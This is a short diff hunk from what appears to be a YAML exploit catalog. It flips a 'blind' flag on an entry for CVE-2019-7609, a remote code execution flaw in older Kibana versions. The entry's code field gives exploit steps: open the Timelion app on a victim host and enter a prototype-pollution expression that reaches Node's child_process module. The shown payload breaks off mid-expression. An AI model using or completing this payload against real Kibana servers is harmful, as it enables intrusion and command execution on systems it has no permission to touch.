@@ -55,7 +55,7 @@ functions:
     version: |
       < 5.6.15 / < 6.6.1
   rce:
-  - blind: false
+  - blind: true
     code: "# CVE-2019-7609: prototype pollution via Timelion \u2192 Node.js worker\
       \ RCE\n# Step 1: navigate to http://victim.com:5601/app/timelion and enter this\
       \ expression:\n#\n# .es(*).props(label.__proto__.env.AAAA='require(\"child_process\"\
